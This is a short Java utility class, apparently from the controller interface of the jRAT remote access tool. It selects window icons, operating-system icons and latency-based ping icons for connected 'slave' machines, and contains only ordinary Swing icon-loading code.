package io.jrat.controller.utils;

import iconlib.IconUtils;
import io.jrat.controller.AbstractSlave;
import java.awt.Image;
import java.util.ArrayList;
import java.util.List;
import javax.swing.ImageIcon;
import oslib.Icons;

public class BasicIconUtils {

	public static List<? extends Image> getFrameIconList(String name) {
		List<Image> list = new ArrayList<Image>();

		String[] order = new String[] { "16x16", "32x32", "64x64", "128x128" };

		for (String s : order) {
			ImageIcon icon = IconUtils.getIcon(name + "-" + s);

			if (icon == null) {
				break;
			} else {
				list.add(icon.getImage());
			}
		}

		return list;
	}

	public static ImageIcon getOSIcon(AbstractSlave slave) {
		String str = Icons.getIconString(slave.getOperatingSystem());

		ImageIcon icon = IconUtils.getIcon(str);
		if (icon == null) {
			icon = IconUtils.getIcon("os_unknown");
		}
		return icon;
	}
	
    public static ImageIcon getPingIcon(AbstractSlave slave) {
        int ping = 0;
        if (slave.getPing() < 50) {
            ping = 0;
        } else if (slave.getPing() < 100) {
            ping = 1;
        } else if (slave.getPing() < 200) {
            ping = 2;
        } else if (slave.getPing() < 400) {
            ping = 3;
        } else if (slave.getPing() < 1000) {
            ping = 4;
        } else {
            ping = 5;
        }

        ImageIcon icon = IconUtils.getIcon("ping" + ping);
        
        return icon;
    }
}
